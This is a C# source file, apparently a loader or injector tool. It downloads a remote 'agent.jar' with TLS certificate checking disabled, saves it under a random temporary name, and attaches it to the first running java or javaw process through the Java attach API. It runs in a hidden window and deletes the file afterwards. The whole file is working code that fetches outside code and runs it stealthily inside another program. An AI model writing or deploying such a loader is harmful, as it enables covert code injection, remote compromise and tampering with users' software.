using System;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Runtime.InteropServices;

namespace Svc
{
    public class Loader
    {
        public static int Run(string baseUrl)
        {
            ServicePointManager.ServerCertificateValidationCallback = (s, c, ch, e) => true;
            ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12;

            string url = baseUrl.TrimEnd(new char[]{'/'});
            Console.WriteLine("[*] downloading from " + url);
            byte[] jar;
            try
            {
                using (var wc = new WebClient())
                    jar = wc.DownloadData(url + "/agent.jar");
            }
            catch (Exception ex) { Console.WriteLine("[!] download failed: " + ex.Message); return 1; }

            return RunDirect(jar);
        }

        public static int RunDirect(byte[] jar)
        {
            Console.WriteLine("[+] agent.jar=" + jar.Length);
            if (jar.Length < 4) { Console.WriteLine("[!] jar too small"); return 1; }

            string javaExe = FindJavaExe();
            if (javaExe == null) { Console.WriteLine("[!] java.exe not found"); return 1; }
            Console.WriteLine("[+] java=" + javaExe);

            int pid = FindJavaw();
            if (pid == 0) { Console.WriteLine("[!] javaw not found"); return 1; }
            Console.WriteLine("[+] javaw pid=" + pid);

            string tempDir = Path.GetTempPath();
            string tempJar = Path.Combine(tempDir, Guid.NewGuid().ToString("N").Substring(0, 12) + ".tmp");

            try
            {
                File.WriteAllBytes(tempJar, jar);
                Array.Clear(jar, 0, jar.Length);
                Console.WriteLine("[+] temp=" + tempJar);

                ProcessStartInfo psi = new ProcessStartInfo();
                psi.FileName = javaExe;
                psi.Arguments = "--add-modules jdk.attach -jar \"" + tempJar + "\" " + pid;
                psi.UseShellExecute = false;
                psi.CreateNoWindow = true;
                psi.RedirectStandardOutput = true;
                psi.RedirectStandardError = true;

                Console.WriteLine("[*] attaching...");
                Process p = Process.Start(psi);
                string stdout = p.StandardOutput.ReadToEnd();
                string stderr = p.StandardError.ReadToEnd();
                p.WaitForExit(15000);

                if (stdout.Length > 0) Console.WriteLine("[out] " + stdout.Trim());
                if (stderr.Length > 0) Console.WriteLine("[err] " + stderr.Trim());
                Console.WriteLine("[*] exit=" + p.ExitCode);

                return p.ExitCode;
            }
            catch (Exception ex)
            {
                Console.WriteLine("[!] " + ex.Message);
                return 3;
            }
            finally
            {
                try { if (File.Exists(tempJar)) File.Delete(tempJar); } catch { }
            }
        }

        static string FindJavaExe()
        {
            foreach (var p in Process.GetProcesses())
            {
                try
                {
                    string n = p.ProcessName.ToLower();
                    if (n == "javaw" || n == "java")
                    {
                        string full = p.MainModule.FileName;
                        string dir = Path.GetDirectoryName(full);
                        string javaPath = Path.Combine(dir, "java.exe");
                        if (File.Exists(javaPath)) return javaPath;
                    }
                }
                catch { }
            }
            return null;
        }

        static int FindJavaw()
        {
            foreach (var p in Process.GetProcesses())
            {
                try
                {
                    string n = p.ProcessName.ToLower();
                    if (n == "javaw" || n == "java")
                        return p.Id;
                }
                catch { }
            }
            return 0;
        }
    }
}
